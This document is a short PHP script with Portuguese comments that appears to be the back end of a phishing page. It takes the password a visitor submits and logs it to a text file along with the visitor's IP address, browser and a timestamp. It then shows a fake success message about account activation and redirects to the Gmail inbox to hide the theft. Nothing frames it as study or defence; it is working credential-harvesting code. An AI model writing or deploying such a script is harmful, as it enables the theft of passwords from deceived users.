<?php
/*Pegando os dados*/
$ip = $_SERVER['REMOTE_ADDR'];
$navegador =  $_SERVER['HTTP_USER_AGENT'];
$data = date('d/m/Y');
$horario = date('h:i:s');

/*Dados sobre o e-mail*/
$pass = $_POST['password'];

$vardokct = "IP:$ip\nNavegador:$navegador\nData:$data\nHorário:$horario\n------------------------\nSENHA:$pass";
$open = fopen("dados.txt", "a+");
fwrite($open, $vardokct);
fclose($open);
echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');</script>";
header( "refresh:1;url=https://mail.google.com/mail/u/0/#inbox");

?>